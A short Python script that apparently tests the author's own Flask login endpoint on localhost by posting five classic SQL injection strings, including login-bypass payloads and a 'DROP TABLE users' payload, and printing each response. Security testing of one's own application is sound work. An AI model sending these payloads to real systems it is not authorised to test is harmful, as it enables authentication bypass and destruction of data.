import requests#used to send HTTP requests (like POST/GET) from Python to your Flask backend.

payloads = [
    "' OR '1'='1",
    "admin' --",
    "'; DROP TABLE users; --",
    "' OR 1=1 --",
    "' OR ''='",
]

for p in payloads:
    data = {"username": p, "password": "x", "role": "admin"}
    r = requests.post("http://127.0.0.1:5000/login", json=data)
    
    print("========================================")
    print(f"Trying Payload: {p!r}")#prints the exact string as it would appear in Python code (with quotes)


    print("Status Code:", r.status_code)
    print("Response   :", r.json())
